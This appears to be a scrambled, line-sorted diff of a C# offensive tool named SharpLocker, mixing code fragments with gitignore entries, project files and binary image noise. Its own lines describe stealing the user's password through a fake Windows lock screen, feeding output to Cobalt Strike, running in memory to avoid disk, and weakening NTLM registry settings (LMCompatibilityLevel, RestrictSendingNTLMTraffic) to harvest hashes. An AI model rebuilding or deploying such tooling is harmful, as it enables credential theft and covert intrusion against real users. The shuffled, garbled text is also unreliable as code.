+" SID == ""S-1-5-96-0-0"" "
+" SID == ""S-1-5-96-0-1"" "
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" are conflicts (Merging from VS is not affected by the settings below, in VS"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" except build/, which is used as an MSBuild target."
+" i, buffer, bufferNdx, len - i)"
+" i, buffer, bufferNdx, partLen)"
+" intervention with every merge. To do so, just uncomment the entries below"
+" otherwise, false.</param>"
+" text.Substring(0, width - 3) "
+" to a newer Visual Studio version. Backup files are not needed,"
+" to allow for direct execution via memory injection using techniques such as execute-assembly found in Cobalt Strike or others, this method prevents the executable from ever touching disk. It is NOT intended to be compilled and run locally on a device. "
+"!H!u!!!""'""U"""""""
+""" id=""W5M0MpCehiHzreSzNTczkc9d"""
+""" xmlns:dc=""http://purl.org/dc/elements/1.1/"" xmlns:photoshop=""http://ns.adobe.com/photoshop/1.0/"" xmp:CreatorTool=""Adobe Photoshop CC 2019 (Windows)"" xmp:CreateDate=""2019-03-21T17:18:34Z"" xmp:MetadataDate=""2019-03-21T17:18:34Z"" xmp:ModifyDate=""2019-03-21T17:18:34Z"" xmpMM:InstanceID=""xmp.iid:42ac8617-3814-b54f-bae6-813119df1201"" xmpMM:DocumentID=""adobe:docid:photoshop:23e6beba-4ed7-1646-82ae-2dd25a504644"" xmpMM:OriginalDocumentID=""xmp.did:31fbba4d-c2e7-5d48-83bd-12d90ba78e83"" dc:format=""image/jpeg"" photoshop:ColorMode=""3"" photoshop:ICCProfile=""sRGB IEC61966-2.1""> <xmpMM:History> <rdf:Seq> <rdf:li stEvt:action=""created"" stEvt:instanceID=""xmp.iid:31fbba4d-c2e7-5d48-83bd-12d90ba78e83"" stEvt:when=""2019-03-21T17:18:34Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)""/> <rdf:li stEvt:action=""saved"" stEvt:instanceID=""xmp.iid:42ac8617-3814-b54f-bae6-813119df1201"" stEvt:when=""2019-03-21T17:18:34Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)"" stEvt:changed=""/""/> </rdf:Seq> </xmpMM:History> </rdf:Description> </rdf:RDF> </x:xmpmeta>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <"
+""" xmlns:dc=""http://purl.org/dc/elements/1.1/"" xmlns:photoshop=""http://ns.adobe.com/photoshop/1.0/"" xmp:CreatorTool=""Adobe Photoshop CC 2019 (Windows)"" xmp:CreateDate=""2019-03-21T17:20:10Z"" xmp:MetadataDate=""2019-03-21T17:20:10Z"" xmp:ModifyDate=""2019-03-21T17:20:10Z"" xmpMM:InstanceID=""xmp.iid:9b3869dd-7efd-8c48-9c56-fb1cd763ef5e"" xmpMM:DocumentID=""adobe:docid:photoshop:2e1e4f49-7f37-7e42-a9b7-b86db4a09ac8"" xmpMM:OriginalDocumentID=""xmp.did:19064fb9-d5d4-0a44-8083-b28cf3a20cfc"" dc:format=""image/jpeg"" photoshop:ColorMode=""3"" photoshop:ICCProfile=""sRGB IEC61966-2.1""> <xmpMM:History> <rdf:Seq> <rdf:li stEvt:action=""created"" stEvt:instanceID=""xmp.iid:19064fb9-d5d4-0a44-8083-b28cf3a20cfc"" stEvt:when=""2019-03-21T17:20:10Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)""/> <rdf:li stEvt:action=""saved"" stEvt:instanceID=""xmp.iid:9b3869dd-7efd-8c48-9c56-fb1cd763ef5e"" stEvt:when=""2019-03-21T17:20:10Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)"" stEvt:changed=""/""/> </rdf:Seq> </xmpMM:History> </rdf:Description> </rdf:RDF> </x:xmpmeta>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <"
+""" xmlns:dc=""http://purl.org/dc/elements/1.1/"" xmlns:photoshop=""http://ns.adobe.com/photoshop/1.0/"" xmp:CreatorTool=""Adobe Photoshop CC 2019 (Windows)"" xmp:CreateDate=""2019-03-21T17:21:33Z"" xmp:MetadataDate=""2019-03-21T17:21:33Z"" xmp:ModifyDate=""2019-03-21T17:21:33Z"" xmpMM:InstanceID=""xmp.iid:50141012-de4c-4140-b740-1e39ec54abfd"" xmpMM:DocumentID=""adobe:docid:photoshop:1f7d0a4d-d7dd-984f-ae4c-7a0ffd071eea"" xmpMM:OriginalDocumentID=""xmp.did:c0e1a976-31ff-b449-bb54-394b971683a1"" dc:format=""image/jpeg"" photoshop:ColorMode=""3"" photoshop:ICCProfile=""sRGB IEC61966-2.1""> <xmpMM:History> <rdf:Seq> <rdf:li stEvt:action=""created"" stEvt:instanceID=""xmp.iid:c0e1a976-31ff-b449-bb54-394b971683a1"" stEvt:when=""2019-03-21T17:21:33Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)""/> <rdf:li stEvt:action=""saved"" stEvt:instanceID=""xmp.iid:50141012-de4c-4140-b740-1e39ec54abfd"" stEvt:when=""2019-03-21T17:21:33Z"" stEvt:softwareAgent=""Adobe Photoshop CC 2019 (Windows)"" stEvt:changed=""/""/> </rdf:Seq> </xmpMM:History> </rdf:Description> </rdf:RDF> </x:xmpmeta>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <"
+"""> <rdf:Description rdf:about="""" xmlns:xmp=""http://ns.adobe.com/xap/1.0/"" xmlns:xmpMM=""http://ns.adobe.com/xap/1.0/mm/"" xmlns:stEvt=""http://ns.adobe.com/xap/1.0/sType/ResourceEvent"
+"""PrH,"
+"""k-}G6"
+"""t/B"
+"%K$z,yz$MQ"
+",7Dy41"
+",9,n,,-"
+",Reference Viewing Condition in IEC61966-2.1"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"<'<e<<=""=a==> >"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<SettingsFile xmlns=""http://schemas.microsoft.com/VisualStudio/2004/01/settings"" CurrentProfile=""(Default)"">"
+"= AlignCentre(column, width) "
+"= Marshal.ReadInt32(pBuffers, CurrentOffset)"
+"> <x:xmpmeta xmlns:x=""adobe:ns:meta/"" x:xmptk=""Adobe XMP Core 5.6-c145 79.163499, 2018/08/13-16:40:22        ""> <rdf:RDF xmlns:rdf=""http://www.w3.org/1999/02/22-rdf-syntax-ns"
+"AQaq"""
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"EUEEF""FgFFG5G{GH"
+"GOTO,"
+"InternalMonologue.cs"" />"
+"InternalMonologueConsole.cs"" />"
+"InternalMonologueResponse.cs"" />"
+"Jz""J"
+"Lsa"", ""LMCompatibilityLevel"", 2)"
+"Lsa"", ""LMCompatibilityLevel"", oldValue_LMCompatibilityLevel)"
+"Lsa"", ""LMCompatibilityLevel"", out oldValue_LMCompatibilityLevel)"
+"MSV1_0"", ""NtlmMinClientSec"", 536870912)"
+"MSV1_0"", ""NtlmMinClientSec"", oldValue_NtlmMinClientSec)"
+"MSV1_0"", ""NtlmMinClientSec"", out oldValue_NtlmMinClientSec)"
+"MSV1_0"", ""RestrictSendingNTLMTraffic"", 0)"
+"MSV1_0"", ""RestrictSendingNTLMTraffic"", oldValue_RestrictSendingNTLMTraffic)"
+"MSV1_0"", ""RestrictSendingNTLMTraffic"", out oldValue_RestrictSendingNTLMTraffic)"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"P5k:,"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""SharpLocker"", ""SharpLocker"
+"Q ,hu$so"
+"QEUQEDQ"""
+"Resources.Designer.cs"">"
+"Resources.resx"">"
+"Settings.Designer.cs"">"
+"Settings.settings"">"
+"SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike. It is written in C"
+"SharpLocker.csproj"", ""{A6F8500F-68BC-4EFC-962A-6C6E68D893AF}"""
+"StringExtensions.cs"" />"
+"System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>"
+"Untitled-1.jpg"" />"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""SharpLocker"")]"
+"[assembly: AssemblyTitle(""SharpLocker"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""a6f8500f-68bc-4efc-962a-6c6e68d893af"")]"
+"arrow.png"" />"
+"bo/IO,WQ"
+"button.jpg"" />"
+"button1.jpg"" />"
+"button1.png"" />"
+"hash.cs"" />"
+"img0.jpg"")"
+"n"", SID, process.ProcessName))"
+"n"", String.Empty)"
+"n"", WindowsIdentity.GetCurrent().Name))"
+"n"", response.Output()))"
+"n"", response.ToString()))"
+"n"", result))"
+"n"", result.ToString()))"
+"ntlm.cs"" />"
+"thumb_14400082930User.png"" />"
+"usericon.png"" />"
+"utils.cs"" />"
+"v""x!"
+"xml version=""1.0"" encoding=""utf-8"""
+"xpacket begin="""
+"xpacket end=""w"""
+"yH.TCO14,xLd"
+"{b_XWb[U,E"
+$$  __$$
+$$  __$$ 
+$$ /  
+$$ /      $$$$$$  / $$$$$$$$ 
+$$ /  $$ 
+$$$$$$
+$$$$$$  
+$$$$$$$
+$$$$$$$ 
+$$$$$$$$
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$lumi
+$tech
+$tf/
+%8%h%%%
+%K_[N=HB
+%Scs5
+%n'RMOGpS
+' as shown below:
+'I'z''(
+'dtU7()
+(@Xr
+(q(()
+)8)k))
+)rEX3O5O)f
+- Backup
+- NetNTLMv2PasswordChecker [opdsealey](https://github.com/opdsealey/NetNTLMv2PasswordChecker)
+->]r@@:
+-A-v--.
+-HP  
+.  CU
+.DOC   diff=astextplain
+.DOCX  diff=astextplain
+.DOT   diff=astextplain
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.IEC 61966-2.1 Default RGB colour space - sRGB
+.JustCode
+.L.../$/Z///050l001
+.PDF   diff=astextplain
+.RTF   diff=astextplain
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cachefile
+.coverage
+.coveragexml
+.cr/personal
+.cs     diff=csharp
+.csproj    merge=binary
+.dbmdl
+.dbproj    merge=binary
+.dbproj.schemaview
+.doc   diff=astextplain
+.docx  diff=astextplain
+.dot   diff=astextplain
+.dotCover
+.e2e
+.fake/
+.fsproj    merge=binary
+.gif   binary
+.gpState
+.hhc
+.hhk
+.hhp
+.htm
+.idea/
+.ilk
+.iobj
+.ipdb
+.j]o
+.jfm
+.jmconfig
+.jpg   binary
+.ldf
+.local.xml
+.localhistory/
+.log
+.lsproj    merge=binary
+.mdf
+.meta
+.mfractor/
+.mm.
+.modelproj merge=binary
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pdf   diff=astextplain
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.png   binary
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.rtf   diff=astextplain
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln       merge=binary
+.sln.docstates
+.sln.iml
+.snk
+.sqlproj   merge=binary
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbproj    merge=binary
+.vbw
+.vcproj    merge=binary
+.vcxproj   merge=binary
+.vs/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.wixproj   merge=binary
+.wwaproj   merge=binary
+.xsd.cs
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+//     Changes to this file may cause incorrect behavior and will be lost if
+//     Runtime Version:4.0.30319.42000
+//     This code was generated by a tool.
+//     the code is regenerated.
+// </auto-generated>
+// <auto-generated>
+// Credit  https://github.com/novotnyllc/cifs/blob/master/Cifs/MD4.cs
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// namespace MD4Hash
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+//------------------------------------------------------------------------------
+//C:5
+/U[m<
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+0x02000000
+1J1112
+1TmJCyE[ok
+1VGq
+2019:03:21 17:18:34
+2019:03:21 17:20:10
+2019:03:21 17:21:33
+2:TPU..
+2F[p
+2Photoshop 3.0
+2c223
+3%@U
+3desc
+4e445
+57[Og
+5M555676r667$7
+5q YRhK9kz
+6DScs
+73m>
+7Ia=[PK[[{x
+8BIM
+8BIM'
+8P889
+99:6:t::
+:JZjz
+:}yVKc
+< }>f S
+</OutputPath>
+</Project>
+</SettingsFile>
+</configuration>
+</root>
+<Jm%
+<M>e'L
+<V0Zc
+<configuration>
+<root>
+= 0x02000000
+= 2)
+= BLOCK_LENGTH)
+= BytesToCopy
+= character
+= len
+= new System.EventHandler(this.LockScreenForm_Load)
+= new System.EventHandler(this.PasswordTextBox_TextChanged)
+= new System.EventHandler(this.SubmitPasswordButton_Click)
+=@Icd{
+=NlZ 
+=[OK[{
+>{J.U%
+@d@@A)AjAAB0BrBBC:C}CD
+ASALocalRun/
+AYIxS
+Adobe
+Adobe Photoshop CC 2019 (Windows)
+Adobe_CM
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPackages/
+AutoTest.Net/
+Backup
+BckgObjc
+BenchmarkDotNet.Artifacts/
+Bl  doub@o
+Bld UntF
+Bltnenum
+BrdTUntF
+Btomlong
+BundleArtifacts/
+CRT curv
+C_9Q
+Clbrbool
+ClientBin/
+Clrm
+CntCbool
+Control
+Copyright (c) 1998 Hewlett-Packard Company
+Cptnbool
+CrnCbool
+CurrentControlSet
+D:4/
+D:}qGyS
+DGDDE
+DINU
+DTdE
+Debug
+Diu}
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+Does not need to do anything if it fails
+EFVU(
+ESliceBGColorType
+ESliceHorzAlign
+ESliceOrigin
+ESliceType
+ESliceVertAlign
+EmlDbool
+EndGlobal
+EndGlobalSection
+EndProject
+Enmr
+Etfy=7z[F7G
+Exif
+FakesAssemblies/
+Fvz/m
+G!/]L
+G$v$n
+GSJ:
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+Grn doub@o
+HKHHI
+HLino
+HideSolutionNode = FALSE
+IEC http://www.iec.ch
+IEC sRGB
+I_1j1
+IcIIJ7J}JK
+Img 
+Inte
+Inteenum
+InternalMonoglogue
+Intrbool
+JmLUj
+KSKKL
+Lblsbool
+LeftUntF
+Leftlong
+LrLM
+Lyr 
+M<qVGq
+MJMMN%NnNO
+MWLKm8/i{
+MinimumVisualStudioVersion = 10.0.40219.1
+MsgeTEXT
+NTLMV2Hasher
+Ngtvbool
+None
+OIOOP'PqPQ
+OIk]yY=
+Objc
+Olc7
+OpenCover/
+Ordn
+O}S{
+PVIdoD]/
+Package.StoreAssociation.xml
+Path
+PgPC
+PgPs
+PgPsenum
+Photoshop 3.0
+Prc@Y
+PstSbool
+PublishScripts/
+Pxl@r
+QPQQR1R
+Qpy2
+R3$brCS
+RGBC
+Rb34rC
+Rbr3$4C
+Rct1
+Rd  doub@o
+Release
+Resources
+Rghtlong
+RgsMbool
+RsltUntF
+S8mw
+S_SSTBTTU(UuUV
+Scl UntF
+ServiceFabricBackup/
+SolutionGuid = {0E6A32D5-7178-4A2D-A3C1-17C574CEA03C}
+StyleCopReport.xml
+TRACE</DefineConstants>
+TestResult.xml
+Top UntF
+Top long
+Trgt8BIM
+Typeenum
+U(]XWb]/.yFMMBmjMqlak{o
+UK=6Hd
+UXWb]
+UeuF'Vfv7GWgw
+Untitled-1.jpg
+UpgradeLog
+V-mcMbS(:j
+V@b7
+VS($5K
+VVWDWWX/X}XY
+VisualStudioVersion = 16.0.28803.352
+WXWb]]
+Wallpaper
+WbXWb[R
+WbXWb]
+WbXWb]]
+Windows
+XICC_PROFILE
+XWb]
+XWb]])
+XWb]z
+XYZ 
+YTSo4o
+Y]!Y5[xu
+YiYZ
+YqV>A
+Z$nV=
+Z8BIM
+ZVZZ[E[[
+ZnyC}g's
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[assembly: ComVisible(false)]
+]']x]
+]]6zgY]
+]_NO7i$
+]ens{
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+_XWb]
+____$$
+______/ 
+______/  
+_______
+________
+__pycache__/
+_afEuusws-
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+aOaabIbbcCccd@dde=eef=ffg=ggh
+acspMSFT
+altTagTEXT
+arrow.png
+artifacts/
+autoGenerated
+b$r%C4Scs5D'6
+bTRC
+bXYZ
+b_XWb]
+bgColorTypeenum
+bkpt
+bld/
+bottomOutsetlong
+boundsObjc
+bower_components/
+builtinProof
+button.jpg
+button1.jpg
+button1.png
+cellTextIsHTMLbool
+cellTextTEXT
+cprt
+cropRectBottomlong
+cropRectLeftlong
+cropRectRightlong
+cropRectToplong
+cropWhenPrintingbool
+crunch
+cs4%
+csx/
+dEU6teuFVfv'7GWgw
+default
+desc
+dlldata.c
+dmnd
+dyMU
+dygMJ
+ecf/
+endif
+endregion
+euFVfvGWgw8HXhx9IYiy
+eufv7GWgw8HXhx)9IYiy
+f CXfz
+gTRC
+gXYZ
+groupIDlong
+healthchecksdb
+hhiCiijHjjkOkklWlm
+horzAlignenum
+http://ns.adobe.com/xap/1.0/
+if DEBUG
+ipch/
+issue-259490424)
+issuecomment-104372622)
+jFvp958
+jfnQ
+kqU/
+lM6-1-
+leftOutsetlong
+lo](
+lwtpt
+mR]3
+meas
+mntrRGB XYZ 
+nCrunchTemp_
+namespace InternalMonologue
+namespace NetNTLMv2Checker
+namespace SharpLocker
+namespace SharpLocker.Properties {
+nkno
+node_modules/
+null
+nullTEXT
+nullobj 
+oDFRU
+originenum
+orleans.codegen.cs
+oxop
+p:}O
+pNL{F{f
+paket-files/
+pdmdd
+pn%G
+ppq:qqrKrs
+printOutput
+printOutputOptions
+printProofSetupObjc
+printSixteenBitbool
+printerNameTEXT
+project.fragment.lock.json
+project.lock.json
+proofCMYK
+proofSetup
+publish/
+qV>I$jNU
+rPhotoshop 3.0
+rTRC
+rXYZ
+raw=true)
+rcf/
+region Windows Form Designer generated code
+rightOutsetlong
+sRGB IEC61966-2.1
+s]st
+sh[LXn
+sig 
+slice
+sliceIDlong
+slicesVlLs
+so2X
+text
+thumb_14400082930User.png
+topOutsetlong
+tptu(uuv>vvwVwx
+uL$h
+um7O21
+urlTEXT
+usericon.png
+using InternalMonologue
+using Microsoft.Win32
+using NetNTLMv2Checker
+using System
+using System.Collections.Generic
+using System.ComponentModel
+using System.Diagnostics
+using System.Drawing
+using System.IO
+using System.Linq
+using System.Reflection
+using System.Runtime.InteropServices
+using System.Security.Cryptography
+using System.Security.Principal
+using System.Text
+using System.Text.RegularExpressions
+using System.Threading
+using System.Threading.Tasks
+using System.Windows.Forms
+vH[XWb]
+vRIO
+vectorDatabool
+vectorMaskEnmr
+vertAlignenum
+view
+vued
+wB_i_
+wOlo
+wwwroot/
+x64/
+x86/
+xR6ea
+xby8
+xml version='1.0' encoding='utf-8'
+xnxy
+y[xXVFr
+yyzFz{
+zHQz
+zM _
+zVy}fg
+zXh[
+zpg_XQKFA
+{A6F8500F-68BC-4EFC-962A-6C6E68D893AF}.Debug
+{A6F8500F-68BC-4EFC-962A-6C6E68D893AF}.Release
+{{Sp
+}o_o
